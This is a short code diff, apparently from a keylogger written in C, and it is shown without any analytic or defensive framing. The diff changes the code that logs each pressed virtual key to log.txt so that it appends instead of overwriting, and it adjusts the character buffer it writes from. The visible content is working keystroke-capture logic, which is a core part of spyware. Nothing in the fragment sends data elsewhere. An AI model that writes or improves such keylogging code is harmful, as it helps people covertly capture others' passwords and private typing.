@@ -57,18 +57,16 @@
   				last_vKey = vKey;
 
   				FILE *f = NULL;
-          //Todo: check if file exist and then use "a" mode instead to append
-  				fopen_s(&f, "log.txt", "w");
+  				fopen_s(&f, "log.txt", "a+");
 
-  				char buf[2];
+  				char buffer[4];
           printf("[*] Key pressed: %c \n", vKey);
-  				sprintf_s(buf, sizeof(buf), "%c", vKey);
-  				fwrite(buf, 1, 1, f);
+  				sprintf_s(buffer, sizeof(buffer), "%c", vKey);
+  				fwrite(buffer, 1, 1, f);
   				fclose(f);
   			}
   		}
   	}
-
   }
 #elif
     // If windows or linux is not defined
